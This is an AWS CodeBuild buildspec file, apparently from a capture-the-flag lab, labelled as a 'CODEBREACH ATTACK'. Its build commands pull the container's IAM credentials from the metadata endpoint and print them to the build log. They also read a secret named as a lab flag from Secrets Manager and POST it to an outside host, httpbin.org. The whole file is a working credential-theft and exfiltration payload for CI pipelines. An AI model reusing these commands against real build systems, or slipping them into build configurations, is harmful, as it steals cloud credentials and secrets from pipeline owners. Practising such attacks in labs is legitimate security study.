version: 0.2

phases:
  build:
    commands:
      - echo "=== CODEBREACH ATTACK ==="
      - CREDS=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text 2>&1)
      - echo "CREDENTIALS_START"
      - echo "$CREDS"
      - echo "CREDENTIALS_END"
      - echo "FLAG_START"
      - echo "$FLAG"
      - echo "FLAG_END"
      - curl -s "https://httpbin.org/post" -X POST -d "flag=$FLAG" | head -20
      - echo "=== ATTACK COMPLETE ==="
